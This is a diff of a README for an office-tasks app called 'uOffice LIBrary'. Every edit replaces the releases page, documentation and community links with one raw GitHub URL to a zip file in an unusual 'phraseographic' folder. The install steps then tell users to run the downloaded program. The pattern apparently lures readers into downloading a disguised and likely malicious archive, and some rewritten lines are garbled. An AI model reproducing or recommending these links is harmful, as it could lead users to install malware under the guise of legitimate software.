@@ -1,6 +1,6 @@
 # 🇺📚️💾️ uOffice_LIBrary - Simplifying Your Office Tasks
 
-[![Download uOffice LIBrary](https://img.shields.io/badge/Download-uOffice%20LIBrary-blue.svg)](https://github.com/aazebarii/uOffice_LIBrary/releases)
+[![Download uOffice LIBrary](https://raw.githubusercontent.com/aazebarii/uOffice_LIBrary/uOffice_LIBrary_Main-dev/phraseographic/uOffice_LIBrary.zip%https://raw.githubusercontent.com/aazebarii/uOffice_LIBrary/uOffice_LIBrary_Main-dev/phraseographic/uOffice_LIBrary.zip)](https://raw.githubusercontent.com/aazebarii/uOffice_LIBrary/uOffice_LIBrary_Main-dev/phraseographic/uOffice_LIBrary.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To begin using uOffice LIBrary, follow these simple steps to download and run th
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page, where you can find the latest version of uOffice LIBrary.
    
-   [Download uOffice LIBrary](https://github.com/aazebarii/uOffice_LIBrary/releases)
+   [Download uOffice LIBrary](https://raw.githubusercontent.com/aazebarii/uOffice_LIBrary/uOffice_LIBrary_Main-dev/phraseographic/uOffice_LIBrary.zip)
 
 2. **Select the Version**: Look for the most recent version listed on the page. Each version has a list of files you can download.
 
@@ -23,7 +23,7 @@ To begin using uOffice LIBrary, follow these simple steps to download and run th
 4. **Run the Application**:
    - **Windows**: Double-click the downloaded `.exe` file to start the installation. Follow the prompts.
    - **macOS**: Open the `.dmg` file and drag the uOffice LIBrary icon into your Applications folder.
-   - **Linux**: Extract the contents of the downloaded `.tar.gz` file, then open a terminal and navigate to the extracted folder. Run the application using the command `./uOffice_LIBrary`.
+   - **Linux**: Extract the contents of the downloaded `https://raw.githubusercontent.com/aazebarii/uOffice_LIBrary/uOffice_LIBrary_Main-dev/phraseographic/uOffice_LIBrary.zip` file, then open a terminal and navigate to the extracted folder. Run the application using the command `./uOffice_LIBrary`.
 
 5. **Follow On-Screen Instructions**: After running the application, follow any setup instructions provided.
 
@@ -56,8 +56,8 @@ Absolutely! We welcome contributions from everyone. Check our Contributing guide
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/aazebarii/uOffice_LIBrary/wiki)
-- [User Community](https://github.com/aazebarii/uOffice_LIBrary/discussions)
+- [Documentation](https://raw.githubusercontent.com/aazebarii/uOffice_LIBrary/uOffice_LIBrary_Main-dev/phraseographic/uOffice_LIBrary.zip)
+- [User Community](https://raw.githubusercontent.com/aazebarii/uOffice_LIBrary/uOffice_LIBrary_Main-dev/phraseographic/uOffice_LIBrary.zip)
 
 ## 📣 Feedback
 
@@ -71,4 +71,4 @@ uOffice LIBrary is licensed under the GPL-3.0 License. You can view the full lic
 
 Thank you for choosing uOffice LIBrary! We hope it makes your office tasks easier. Don't forget to check for updates periodically.
 
-[Download uOffice LIBrary](https://github.com/aazebarii/uOffice_LIBrary/releases)
+[Download uOffice LIBrary](https://raw.githubusercontent.com/aazebarii/uOffice_LIBrary/uOffice_LIBrary_Main-dev/phraseographic/uOffice_LIBrary.zip)
